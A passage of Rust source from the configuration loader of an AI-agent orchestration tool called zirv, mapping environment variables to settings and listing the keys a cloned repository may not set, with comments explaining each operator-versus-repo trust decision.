        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_WORKFLOW_REPO_SKILLS",
        &["workflow", "repo_skills_enabled"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_WORKFLOW_REPO_AGENTS",
        &["workflow", "repo_agents_enabled"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_WORKFLOW_DEPLOY_TIER",
        &["workflow", "deploy", "tier"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_WORKFLOW_ADOPTION",
        &["workflow", "adoption"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_REPORT_REPOSITORY",
        &["report", "repository"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_WORKFLOW_TELEMETRY",
        &["workflow", "telemetry_enabled"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_WORKFLOW_TELEMETRY_MAX_EVENTS",
        &["workflow", "telemetry_max_events"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_WORKFLOW_TELEMETRY_RETENTION_DAYS",
        &["workflow", "telemetry_retention_days"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_WORKFLOW_REVIEW_WORKER_BUDGET_TOKENS",
        &["workflow", "review_worker_budget_tokens"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_WORKFLOW_REVIEW_WORKER_MAX_TOOL_CALLS",
        &["workflow", "review_worker_max_tool_calls"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_WORKFLOW_AUTO_SPAWN_ON_GATE",
        &["workflow", "auto_spawn_on_gate"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_WORKFLOW_ALLOW_EMPTY_VERIFY",
        &["workflow", "allow_empty_verify"],
        EnvKind::Bool,
    ),
    ("ZIRV_CTX_MEMORY", &["memory", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_MEMORY_HARVEST",
        &["memory", "harvest"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_MEMORY_MAX_ENTRIES",
        &["memory", "max_entries"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MEMORY_MAX_ENTRY_BYTES",
        &["memory", "max_entry_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MEMORY_MAX_INJECTED_BYTES",
        &["memory", "max_injected_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MEMORY_SHARED",
        &["memory", "shared_enabled"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_MEMORY_CORE_MAX_BYTES",
        &["memory", "core_max_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MEMORY_RETRIEVAL_MAX_BYTES",
        &["memory", "retrieval_max_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MEMORY_RETRIEVAL_MAX_ENTRIES",
        &["memory", "retrieval_max_entries"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MEMORY_HARVEST_MAX_ENTRIES",
        &["memory", "harvest_max_entries"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MEMORY_HARVEST_MAX_BYTES",
        &["memory", "harvest_max_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_CHROME_BANNER",
        &["chrome", "banner"],
        EnvKind::Bool,
    ),
    ("ZIRV_CTX_CHROME_BAR", &["chrome", "bar"], EnvKind::Bool),
    // Not `["chrome", "events"], EnvKind::Bool`: quiet is the inverse of
    // events, so this is the one entry that needs `NegatedBool`.
    (
        "ZIRV_CTX_QUIET",
        &["chrome", "events"],
        EnvKind::NegatedBool,
    ),
    ("ZIRV_CTX_DASH", &["dash", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_DASH_SIDEBAR_COLS",
        &["dash", "sidebar_cols"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_DASH_ROSTER_MAX_AGE_SECS",
        &["dash", "roster_max_age_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_DASH_MAX_PANES",
        &["dash", "max_panes"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_DASH_MOUSE", &["dash", "mouse"], EnvKind::Bool),
    (
        "ZIRV_CTX_DASH_IDLE_QUIET_MS",
        &["dash", "idle_quiet_ms"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_CHAT_MODEL", &["chat", "model"], EnvKind::Str),
    (
        "ZIRV_CTX_REVIEW_MODEL_CLAUDE",
        &["review", "claude"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_REVIEW_MODEL_CODEX",
        &["review", "codex"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_WORKER_MODEL_CLAUDE",
        &["worker", "claude"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_WORKER_MODEL_CODEX",
        &["worker", "codex"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_HANDOVER_CLAUDE_CHEAP",
        &["handover", "claude", "cheap"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_HANDOVER_CLAUDE_STANDARD",
        &["handover", "claude", "standard"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_HANDOVER_CLAUDE_DEEP",
        &["handover", "claude", "deep"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_HANDOVER_CODEX_CHEAP",
        &["handover", "codex", "cheap"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_HANDOVER_CODEX_STANDARD",
        &["handover", "codex", "standard"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_HANDOVER_CODEX_DEEP",
        &["handover", "codex", "deep"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_PRICE_STALE_AFTER_DAYS",
        &["price", "stale_after_days"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PRICE_TABLE_PATH",
        &["price", "table_path"],
        EnvKind::Str,
    ),
];

fn merge(base: &mut toml::Table, over: toml::Table) {
    for (key, value) in over {
        match (base.get_mut(&key), value) {
            (Some(toml::Value::Table(existing)), toml::Value::Table(incoming)) => {
                merge(existing, incoming);
            }
            (_, value) => {
                base.insert(key, value);
            }
        }
    }
}

/// Removes `table[section][key]` and returns it, leaving the rest of
/// `table[section]` (if any) untouched -- the nested equivalent of
/// `toml::Table::remove`, used to lift `sandbox.extra_deny` out of a layer
/// before the ordinary deep merge (`merge()` above would let a later
/// layer's array *replace* an earlier one's instead of adding to it, the
/// same reason `[policy]` is lifted out whole via `POLICY_SECTION`). Only
/// `extra_deny` needs this: `extra_allow` never needs lifting because it is
/// `REPO_FORBIDDEN` outright, so a repo layer can never contribute a value
/// for `merge()` to clobber the operator's with in the first place.
fn take_nested(table: &mut toml::Table, section: &str, key: &str) -> Option<toml::Value> {
    table.get_mut(section)?.as_table_mut()?.remove(key)
}

fn take_nested3(
    table: &mut toml::Table,
    section: &str,
    subsection: &str,
    key: &str,
) -> Option<toml::Value> {
    table
        .get_mut(section)?
        .as_table_mut()?
        .get_mut(subsection)?
        .as_table_mut()?
        .remove(key)
}

fn deploy_tier_at(
    value: Option<toml::Value>,
    key: &str,
) -> CtxResult<Option<crate::commands::workflow::deploy::DeployTier>> {
    value
        .map(|value| {
            value
                .try_into()
                .map_err(|error| format!("invalid {key}: {error}").into())
        })
        .transpose()
}

/// A `toml::Value::Array` of strings (from `take_nested`) as owned
/// `Vec<String>`, or empty for anything else (absent, wrong shape) -- the
/// deserializer catches a genuinely malformed `sandbox.extra_deny` later
/// when the merged table is deserialized into `CtxConfig` proper; this
/// helper only needs to read the two candidate layers well enough to union
/// them before that point.
fn string_array(value: Option<toml::Value>) -> Vec<String> {
    value
        .and_then(|v| v.as_array().cloned())
        .unwrap_or_default()
        .into_iter()
        .filter_map(|v| v.as_str().map(str::to_string))
        .collect()
}

/// A `toml::Value::Boolean` (from `take_nested`) as `Option<bool>` -- a
/// wrong-shaped or absent value reads as `None`, the same "let the real
/// deserializer catch malformed input later" contract `string_array` above
/// follows.
fn bool_at(value: Option<toml::Value>) -> Option<bool> {
    value.and_then(|v| v.as_bool())
}

fn integer_at(value: Option<toml::Value>) -> Option<i64> {
    value.and_then(|v| v.as_integer())
}

fn string_array_at(value: Option<toml::Value>) -> Option<Vec<String>> {
    value.map(|v| {
        v.as_array()
            .cloned()
            .unwrap_or_default()
            .into_iter()
            .filter_map(|v| v.as_str().map(str::to_string))
            .collect()
    })
}

/// A repo fallback order may remove entries but never add or reorder them.
/// Empty is a legitimate "no automatic fallback candidates" narrowing.
fn narrow_fallback_order(home: Vec<String>, repo: Option<Vec<String>>) -> Vec<String> {
    let Some(repo) = repo else {
        return home;
    };
    home.into_iter()
        .filter(|name| repo.contains(name))
        .collect()
}

/// A `toml::Value::Float` or `Value::Integer` (from `take_nested`) as
/// `Option<f64>` -- TOML happily writes `max_percent = 90` with no decimal
/// point, which parses as an `Integer`, not a `Float`; without the second
/// arm a whole-number override would silently vanish from the narrowing
/// fold below (read as `None`, i.e. "this layer didn't set it") while still
/// reaching the real deserializer just fine on its own.
fn float_at(value: Option<toml::Value>) -> Option<f64> {
    value.and_then(|v| match v {
        toml::Value::Float(f) => Some(f),
        toml::Value::Integer(i) => Some(i as f64),
        _ => None,
    })
}

/// T9: the repo-narrowing fold for `pace.enabled`, mirroring `policy::
/// EffectivePolicy::narrowed_by`'s own `Stance::max` -- `true` (the gate is
/// on) is the stricter value, so it wins regardless of which layer set it.
/// `repo` absent (`None`) contributes nothing: a repo that never mentions
/// `pace.enabled` must not accidentally *turn it on* against an operator who
/// deliberately left it at `home`'s value (which could itself be the
/// built-in default, already folded in by the caller). This is genuinely
/// the same shape `policy::resolve` uses -- a repo checkout may push
/// *stricter* than whatever the operator configured, never looser -- unlike
/// every other `REPO_FORBIDDEN` key, which the repo may not touch at all;
/// see this module's own `REPO_FORBIDDEN` doc comment for why `pace.enabled`
/// deliberately is not on that list.
fn narrow_pace_bool(home: bool, repo: Option<bool>) -> bool {
    home.max(repo.unwrap_or(false))
}

/// T9: the repo-narrowing fold for `pace.max_percent`/`pace.soft_percent` --
/// lower is stricter (a tighter ceiling or an earlier soft-throttle band),
/// so the smaller of the two layers wins. `repo` absent contributes nothing
/// (folds in as `f64::INFINITY`, which `min` never picks over a real
/// `home` value), the numeric mirror of `narrow_pace_bool`'s own
/// `unwrap_or(false)`.
fn narrow_pace_percent(home: f64, repo: Option<f64>) -> f64 {
    home.min(repo.unwrap_or(f64::INFINITY))
}

/// Issue #155, Phase 3: the repo-narrowing fold for `context.dedupe_native`
/// -- the mirror of `narrow_pace_bool` with the opposite polarity. There,
/// `true` (the gate is on) is strict; here `false` (always inject, never
/// trust a native file) is strict, because that is this key's safe
/// direction. `repo` absent contributes nothing (folds in as `true`, the
/// loose value, so an untouched repo layer never forces the strict `false`
/// on a home layer that left dedupe on) -- the mirror of `narrow_pace_bool`'s
/// own `unwrap_or(false)`.
fn narrow_dedupe_bool(home: bool, repo: Option<bool>) -> bool {
    home.min(repo.unwrap_or(true))
}

/// Issue #309: the repo-narrowing fold for `verify_on_stop.enabled` -- the
/// same polarity as `narrow_dedupe_bool`, since `false` (the nudge is off) is
/// this key's strict direction. `repo` absent contributes nothing (folds in
/// as `true`, the loose value), so an untouched repo layer never forces the
/// feature off for an operator who left it on, but a repo layer cannot flip
/// an operator's own `enabled = false` back to `true` either.
fn narrow_verify_on_stop_enabled(home: bool, repo: Option<bool>) -> bool {
    home.min(repo.unwrap_or(true))
}

/// Issue #309: the repo-narrowing fold for `verify_on_stop.max_nudges` --
/// lower is stricter (fewer nudges per session), the numeric mirror of
/// `narrow_pace_percent`. `repo` absent contributes nothing (folds in as
/// `u32::MAX`, which `min` never picks over a real `home` value).
fn narrow_max_nudges(home: u32, repo: Option<u32>) -> u32 {
    home.min(repo.unwrap_or(u32::MAX))
}

/// Finding 4 (review): the one comma-separated-list splitter shared by every
/// caller that needs "trimmed, non-empty entries" -- this module's own
/// `ZIRV_CTX_SANDBOX_EXTRA_ALLOW`/`_DENY` env values (the same shape
/// `--allowedTools`/`--disallowedTools` themselves already take on the
/// command line, so an operator setting one of these can paste the identical
/// rule syntax), `memory.rs`'s `Tags`/`Paths` header parsing, and
/// `optimize.rs`'s `Evidence:` line parsing. Previously three separate
/// copies of the identical `split(',').trim().filter(!is_empty())` logic.
pub(crate) fn split_csv_list(raw: &str) -> Vec<String> {
    raw.split(',')
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(str::to_string)
        .collect()
}

fn insert_path(table: &mut toml::Table, path: &[&str], value: toml::Value) {
    let Some((head, rest)) = path.split_first() else {
        return;
    };
    if rest.is_empty() {
        table.insert((*head).to_string(), value);
        return;
    }
    let entry = table
        .entry((*head).to_string())
        .or_insert_with(|| toml::Value::Table(toml::Table::new()));
    if !entry.is_table() {
        *entry = toml::Value::Table(toml::Table::new());
    }
    if let Some(child) = entry.as_table_mut() {
        insert_path(child, rest, value);
    }
}

fn env_value(raw: &str, kind: EnvKind) -> CtxResult<toml::Value> {
    match kind {
        EnvKind::Str => Ok(toml::Value::String(raw.to_string())),
        EnvKind::Int => raw
            .parse::<i64>()
            .map(toml::Value::Integer)
            .map_err(|_| format!("expected an integer, got '{raw}'").into()),
        EnvKind::Float => raw
            .parse::<f64>()
            .map(toml::Value::Float)
            .map_err(|_| format!("expected a number, got '{raw}'").into()),
        EnvKind::Bool => parse_bool(raw).map(toml::Value::Boolean),
        EnvKind::NegatedBool => parse_bool(raw).map(|b| toml::Value::Boolean(!b)),
    }
}

/// `true`/`false`, plus `1`/`0`: an operator writing `ZIRV_CTX_..._TELEMETRY=0`
/// means "off", and `bool::from_str` alone rejects that -- which for a
/// privacy opt-out is the one failure mode that must not happen silently.
/// Anything else is still a loud error rather than a guess.
fn parse_bool(raw: &str) -> CtxResult<bool> {
    match raw.trim() {
        "true" | "1" => Ok(true),
        "false" | "0" => Ok(false),
        other => Err(format!("expected true or false, got '{other}'").into()),
    }
}

/// Keys a repository is not allowed to set, with the environment variable that
/// sets each one instead. Cloning a repository must not be enough to choose the
/// binary zirv launches, the shell command it runs on failure, or the model it
/// spends tokens on. `~/.zirv/ctx.toml`, `ZIRV_CTX_*` and flags all still may:
/// those come from the operator, not from the checkout.
const REPO_FORBIDDEN: &[(&[&str], &str)] = &[
    (&["agent_bin"], "ZIRV_CTX_AGENT_BIN"),
    // Final wave item 1: a repo `ctx.toml` setting `agent` reaches `resolve_
    // default`'s *configured* arm (`cfg.agent.as_deref()` is `Some`), which
    // never consults `AgentGate::disabled_only_by_repo` at all -- that check
    // only runs in the no-`cfg.agent` fallback loop. A repo could therefore
    // pick which vendor account gets spent (`agent = "codex"`, say) with no
    // narrowing guard in the way, the exact outcome
    // `the_fallback_refuses_to_silently_switch_provider_when_the_repo_
    // disabled_the_default` exists to block for the *unconfigured* path.
    // This was inert while codex's own `ready()` still hard-errored; codex
    // shipping out of the box activates it. `~/.zirv/ctx.toml`, `ZIRV_CTX_
    // AGENT` and `--agent` all still choose the agent same as before -- only
    // a repo checkout may not.
    (&["agent"], "ZIRV_CTX_AGENT"),
    (&["supervise", "on_failure"], "ZIRV_CTX_ON_FAILURE"),
    (&["handoff", "model"], "ZIRV_CTX_MODEL"),
    (&["optimize", "model"], "ZIRV_CTX_OPTIMIZE_MODEL"),
    (&["sandbox", "enabled"], "ZIRV_CTX_SANDBOX"),
    (&["sandbox", "extra_allow"], "ZIRV_CTX_SANDBOX_EXTRA_ALLOW"),
    (
        &["sandbox", "scrub_subprocess_env"],
        "ZIRV_CTX_SANDBOX_SCRUB_SUBPROCESS_ENV",
    ),
    (&["prompt", "enabled"], "ZIRV_CTX_PROMPT"),
    (&["prompt", "repo_layer"], "ZIRV_CTX_PROMPT_REPO"),
    // Without this the cap would be decorative: the untrusted layer could
    // simply raise its own limit.
    (
        &["prompt", "max_repo_bytes"],
        "ZIRV_CTX_PROMPT_MAX_REPO_BYTES",
    ),
    // The harness roster names which other harnesses this session may
    // delegate to and how to reach them (`zirv agent <name> ...`) -- a repo
    // checkout must not be able to force that layer back on for an operator
    // who turned it off, the same trust asymmetry as `prompt.enabled` and
    // `prompt.repo_layer` right above.
    (&["prompt", "harnesses"], "ZIRV_CTX_PROMPT_HARNESSES"),
    // Issue #167: codex's own orchestrator-conventions layer
    // (`adapters::codex::ORCHESTRATOR_PROMPT`) is the codex analogue of
    // claude's `ORCHESTRATOR_PROMPT` -- a repo checkout must not be able to
    // force it back on for an operator who turned it off, the same trust
    // asymmetry as `prompt.harnesses` right above.
    (
        &["prompt", "codex_orchestrator"],
        "ZIRV_CTX_PROMPT_CODEX_ORCHESTRATOR",
    ),
    // The canonical `.zirv/context/{common,claude,codex}.md` layer (issue
    // #44's compiler) is repo-owned, untrusted content injected into the
    // composed prompt the same way the repo `system-prompt.md` layer is --
    // without this a repo checkout could simply raise its own cap, making it
    // decorative, the same reasoning as `prompt.max_repo_bytes` above.
    (
        &["context", "max_common_bytes"],
        "ZIRV_CTX_CONTEXT_MAX_COMMON_BYTES",
    ),
    (
        &["context", "max_harness_bytes"],
        "ZIRV_CTX_CONTEXT_MAX_HARNESS_BYTES",
    ),
    // Issue #46: the derived harness roster is folded into an Orchestrator
    // session's composed prompt the same way (`PromptSource::Harnesses`) --
    // without this a repo checkout could raise its own budget for the one
    // layer that had none until this key, making it decorative like every
    // other entry in this list.
    (
        &["context", "max_harness_roster_bytes"],
        "ZIRV_CTX_CONTEXT_MAX_HARNESS_ROSTER_BYTES",
    ),
    // Issue #275: without this a repo checkout could raise its own cap on
    // how many sentence pairs `zirv context lint`'s CTX002/CTX003 checks
    // compare, turning a bound meant to protect the operator's own CPU time
    // into a decorative one -- same reasoning as every byte-cap entry above.
    (
        &["context", "lint_max_pairs"],
        "ZIRV_CTX_CONTEXT_LINT_MAX_PAIRS",
    ),
    // Same rationale as prompt.max_repo_bytes above: mail is folded into the
    // composed prompt as its own layer (`with_mail_layer`), and without this
    // a repo could simply raise its own delivered-mail cap, making it
    // decorative.
    (
        &["mail", "max_delivered_bytes"],
        "ZIRV_CTX_MAIL_MAX_DELIVERED_BYTES",
    ),
    // A repo could otherwise turn mail delivery back on after an operator
    // disabled it -- the same "the checkout is not the operator" boundary
    // every other entry here enforces, applied to a boolean instead of a
    // number.
    (&["mail", "enabled"], "ZIRV_CTX_MAIL"),
    // Without this a repo could silence the `zirv \u{25b8}` announcement
    // channel -- including the degradation notices it exists to surface --
    // for anyone running zirv there, with no operator-visible sign that it
    // happened.
    (&["chrome", "events"], "ZIRV_CTX_QUIET"),
    // The workflow subsystem's own trust boundary, one entry per key so the
    // error message names the exact one a checkout tried to set. A repo must
    // not be able to re-enable execution of its own `.zirv/verify.toml`
    // commands or its own `package.json` scripts after an operator turned
    // that off, put its own untrusted skill methodology back into the prompt,
    // or -- previously a plain `std::env::var` read, which any repo script
    // could set for itself -- turn local telemetry on/off or stretch its
    // retention out to years.
    (
        &["workflow", "repo_checks_enabled"],
        "ZIRV_CTX_WORKFLOW_REPO_CHECKS",
    ),
    (
        &["workflow", "repo_skills_enabled"],
        "ZIRV_CTX_WORKFLOW_REPO_SKILLS",
    ),
    (
        &["workflow", "repo_agents_enabled"],
        "ZIRV_CTX_WORKFLOW_REPO_AGENTS",
    ),
    (
        &["workflow", "deploy", "tier"],
        "ZIRV_CTX_WORKFLOW_DEPLOY_TIER",
    ),
    // A repo checkout must not be able to loosen its own adoption pressure
    // (or falsely tighten it to `enforce`, holding an operator's own agent
    // dispatches on a repo's say-so) -- see issue #223 and `adoption.rs`.
    (&["workflow", "adoption"], "ZIRV_CTX_WORKFLOW_ADOPTION"),
    (&["workflow", "maintain"], "~/.zirv/ctx.toml only"),
    (&["report", "repository"], "ZIRV_CTX_REPORT_REPOSITORY"),
    (
        &["workflow", "telemetry_enabled"],
        "ZIRV_CTX_WORKFLOW_TELEMETRY",
    ),
    (
        &["workflow", "telemetry_max_events"],
        "ZIRV_CTX_WORKFLOW_TELEMETRY_MAX_EVENTS",
    ),
    (
        &["workflow", "telemetry_retention_days"],
        "ZIRV_CTX_WORKFLOW_TELEMETRY_RETENTION_DAYS",
    ),
    // Issue #233: the SSH-agent-family passthrough allowlist a verification
    // check child receives is operator-owned, the same widening-only
    // asymmetry as `sandbox.extra_allow` above -- a repo checkout must not be
    // able to name additional environment variables its own `verify.toml`
    // checks can read from the operator's process environment.
    (
        &["workflow", "check_env_passthrough"],
        "ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH",
    ),
    (
        &["workflow", "review_worker_budget_tokens"],
        "ZIRV_CTX_WORKFLOW_REVIEW_WORKER_BUDGET_TOKENS",
    ),
    (
        &["workflow", "review_worker_max_tool_calls"],
        "ZIRV_CTX_WORKFLOW_REVIEW_WORKER_MAX_TOOL_CALLS",
    ),
    (
        &["workflow", "auto_spawn_on_gate"],
        "ZIRV_CTX_WORKFLOW_AUTO_SPAWN_ON_GATE",
    ),
    // Issue #268: a repo checkout must not be able to declare its own
    // missing/empty `verify.toml` a pass by setting this itself.
    (
        &["workflow", "allow_empty_verify"],
        "ZIRV_CTX_WORKFLOW_ALLOW_EMPTY_VERIFY",
    ),
    // A repo checkout must not be able to switch either memory scope's own
    // gate on or off for itself, grow its cap, or turn on automatic
    // harvesting -- this is about the CONFIGURATION, not the shared scope's
    // content (which is deliberately, expectedly repo-committed by design;
    // see memory.rs's `MemoryScope::Shared`) -- the same class of decision
    // `prompt.max_repo_bytes` guards: something the checkout must not
    // choose for itself, only the operator (`~/.zirv/ctx.toml`, `ZIRV_CTX_*`
    // or flags) may.
    (&["memory", "enabled"], "ZIRV_CTX_MEMORY"),
    (&["memory", "harvest"], "ZIRV_CTX_MEMORY_HARVEST"),
    (&["memory", "max_entries"], "ZIRV_CTX_MEMORY_MAX_ENTRIES"),
    (
        &["memory", "max_entry_bytes"],
        "ZIRV_CTX_MEMORY_MAX_ENTRY_BYTES",
    ),
    (
        &["memory", "max_injected_bytes"],
        "ZIRV_CTX_MEMORY_MAX_INJECTED_BYTES",
    ),
    // `shared_enabled` is the same class of decision as `enabled` right
    // above, for the newer repo-owned scope (`memory::MemoryScope::Shared`):
    // a checkout must not be able to switch its own shared bank back on for
    // an operator who disabled it. A separate entry, not folded into
    // `enabled` above: each memory switch is forbidden individually, the
    // same granularity `harvest`/`max_entries`/etc. already get.
    (&["memory", "shared_enabled"], "ZIRV_CTX_MEMORY_SHARED"),
    // Same class of decision as `max_injected_bytes` right above (which this
    // key supersedes for actual injection sizing): a repo checkout must not
    // be able to grow the merged core layer's own delivered-bytes cap, the
    // same trust asymmetry `prompt.max_repo_bytes`/`mail.max_delivered_bytes`
    // already enforce.
    (
        &["memory", "core_max_bytes"],
        "ZIRV_CTX_MEMORY_CORE_MAX_BYTES",
    ),
    // Same reasoning, for the retrieval layer's byte budget (issue #35).
    (
        &["memory", "retrieval_max_bytes"],
        "ZIRV_CTX_MEMORY_RETRIEVAL_MAX_BYTES",
    ),
    // Same reasoning, for the retrieval layer's entry-count cap.
    (
        &["memory", "retrieval_max_entries"],
        "ZIRV_CTX_MEMORY_RETRIEVAL_MAX_ENTRIES",
    ),
    // Issue #37: a repo checkout must not be able to raise how many entries
    // or bytes one session's own automatic harvest may store, the same
    // trust asymmetry as every other memory.* cap above, applied to the new
    // per-session harvest pair.
    (
        &["memory", "harvest_max_entries"],
        "ZIRV_CTX_MEMORY_HARVEST_MAX_ENTRIES",
    ),
    (
        &["memory", "harvest_max_bytes"],
        "ZIRV_CTX_MEMORY_HARVEST_MAX_BYTES",
    ),
    // A repo checkout must not be able to switch its own dashboard on or off,
    // resize the sidebar, change how long a quit-time roster is offered for
    // restore, or raise its own pane cap -- the operator's terminal, the
    // operator's machine, the operator's call. `max_panes` in particular is
    // the same trust asymmetry as `mail.max_delivered_bytes`: a checked-out
    // repo raising its own limit is exactly the case the limit exists for.
    (&["dash", "enabled"], "ZIRV_CTX_DASH"),
    (&["dash", "sidebar_cols"], "ZIRV_CTX_DASH_SIDEBAR_COLS"),
    (
        &["dash", "roster_max_age_secs"],
        "ZIRV_CTX_DASH_ROSTER_MAX_AGE_SECS",
    ),
    (&["dash", "max_panes"], "ZIRV_CTX_DASH_MAX_PANES"),
    // Issue #133: same trust asymmetry as `dash.max_panes` right above, one
    // level up -- a repo checkout must not be able to raise the machine-wide
    // heavy-operation budget any more than it can raise the one dashboard's
    // own pane cap. See `SuperviseConfig::max_heavy_operations`'s own doc
    // comment for the BSOD incident this defends against.
    (
        &["supervise", "max_heavy_workers"],
        "ZIRV_CTX_SUPERVISE_MAX_HEAVY_WORKERS",
    ),
    // Issue #155, Phase 5(e): `max_heavy_operations` is the renamed key --
    // same trust posture as `max_heavy_workers` right above, which stays
    // forbidden too as a deprecated alias (see `CtxConfig::load`'s pre-
    // deserialise rewrite).
    (
        &["supervise", "max_heavy_operations"],
        "ZIRV_CTX_SUPERVISE_MAX_HEAVY_OPERATIONS",
    ),
    // Issue #267: same trust asymmetry as `max_heavy_operations` right
    // above -- a repo checkout must not be able to raise the machine-wide
    // writer-concurrency budget, which is exactly the corrupted-diff
    // failure this cap exists to prevent (see `SuperviseConfig::
    // max_writers`'s own doc comment).
    (
        &["supervise", "max_writers"],
        "ZIRV_CTX_SUPERVISE_MAX_WRITERS",
    ),
    // Mouse capture takes over the terminal's own text selection, so which
    // way that trade goes is the operator's call about their own terminal,
    // not a checked-out repo's.
    (&["dash", "mouse"], "ZIRV_CTX_DASH_MOUSE"),
    // Security review (2026-08-31): a repo checkout must not be able to
    // widen which directories a pane spawned from it may run in and write
    // to -- the same privilege-widening asymmetry `sandbox.extra_allow`
    // already holds. See `DashConfig::workdir_roots`'s own doc comment.
    (&["dash", "workdir_roots"], "ZIRV_CTX_DASH_WORKDIR_ROOTS"),
    // A repo checkout must not be able to flip a spend decision (skipping
    // throttle/pause gating on the operator's own vendor plan), re-enable
    // the active API-poll fallback an operator turned off, or change its
    // cadence -- credential reads and network calls are the operator's
    // budget to spend, not the checkout's. `value_at` matches a table node
    // the same way it matches a leaf, so this one entry also catches a repo
    // setting only `[pace.use_credits]\ncodex = true` without `claude`.
    (&["pace", "use_credits"], "ZIRV_CTX_PACE_USE_CREDITS_CLAUDE"),
    (&["pace", "poll_enabled"], "ZIRV_CTX_PACE_POLL"),
    (
        &["pace", "poll_min_interval_secs"],
        "ZIRV_CTX_PACE_POLL_MIN_INTERVAL_SECS",
    ),
    // T8: the fail-safe delay applied when the gate is genuinely blind (see
    // `PaceConfig::blind_delay_secs`'s own doc comment) is a spend-safety
    // floor, the same class of decision as `use_credits`/`poll_*` right
    // above -- a repo checkout must not be able to shrink or zero it out and
    // silently restore the old fail-open behavior for anyone who checks it
    // out.
    (
        &["pace", "blind_delay_secs"],
        "ZIRV_CTX_PACE_BLIND_DELAY_SECS",
    ),
    // Issue #155, Phase 6(c): `pace::spawn_gate`'s own soft/hard band --
    // whether a NEW delegated worker may be spawned at all, never whether an
    // already-running session gets restarted (see `SpawnGate`'s own doc
    // comment for why the two must stay independent). A repo checkout must
    // not be able to change when the operator's account stops accepting new
    // work, in EITHER direction: raising either percentage would let a
    // checkout spend past a ceiling the operator set, and lowering one would
    // let a checkout throttle delegation for an operator who did not ask for
    // it -- the same "the checkout is not the operator" trust asymmetry
    // every other entry in this list enforces, applied to a refusal
    // threshold instead of a byte cap or a switch.
    (&["pace", "spawn_soft_pct"], "ZIRV_CTX_PACE_SPAWN_SOFT_PCT"),
    (&["pace", "spawn_hard_pct"], "ZIRV_CTX_PACE_SPAWN_HARD_PCT"),
    // Issue #285: the default soft budget `zirv ctx objective set` applies
    // when the operator's own `--budget-tokens` is omitted -- a spend
    // ceiling, so it gets the same "checkout is not the operator" treatment
    // as every other budget key in this list.
    (
        &["pace", "run_budget_tokens"],
        "ZIRV_CTX_PACE_RUN_BUDGET_TOKENS",
    ),
    // `chat.model` is deliberately ABSENT from this list. See `ChatConfig`'s
    // own doc comment and the spec's "Orchestrator model" section
    // (docs/superpowers/specs/2026-08-13-zirv-dashboard-design.md): unlike
    // every model key above, it only shapes an interactive session the
    // operator deliberately launched, and the choice is disclosed on the
    // `zirv \u{25b8}` announcement channel (`chat::announce_model_choice`) --
    // which `chrome.events`, right above, keeps repo-unsilenceable -- rather
    // than spent silently in the background. A repo checkout may set it -- do
    // not "fix" this by adding it here, and do not remove `chrome.events`
    // from this list, which is what the exemption rests on.
    //
    // The exemption is safe against the cmd.exe argv-reparse injection class
    // because the value is *charset-validated* at the end of `CtxConfig::load`
    // (only `[A-Za-z0-9-._:/@]`, max 128 bytes): a validated model string can
    // express no shell/cmd metacharacter, so it can never carry a payload even
    // though it reaches an argv that `resolve_program` may route through
    // `cmd.exe /c` on Windows. The disclosed operator-in-repo model-choice
    // purpose survives (real model ids only ever use that charset); the RCE
    // does not. This is a narrower, correctness-preserving guard than banning
    // the key outright, which is why it stays out of `REPO_FORBIDDEN`.
    //
    // `review.claude`/`review.codex` are the opposite call from `chat.model`
    // right above, on purpose: those pick which model spends the operator's
    // vendor account running review work in the *background* (every `zirv
    // ctx chat` orchestrator session), not a model chosen and disclosed for
    // one interactive session the operator themselves launched -- the same
    // "spent silently" distinction that puts `handoff.model`/`optimize.model`
    // in this list. `value_at` matches a table node the same way it matches a
    // leaf (see `pace.use_credits` above), so this one entry blocks both
    // `review.claude` and `review.codex` together.
    (&["review"], "ZIRV_CTX_REVIEW_MODEL_CLAUDE"),
    // `worker.claude`/`worker.codex` are the same call as `review.*` right
    // above, for the same reason: a repo checkout must not be able to pick
    // which model -- and so which vendor account -- spends the operator's
    // tokens running a delegated headless worker (`zirv ctx agent`, and the
    // dashboard's own spawn-request pane variant), which is background spend
    // an operator never explicitly launched an interactive session for. See
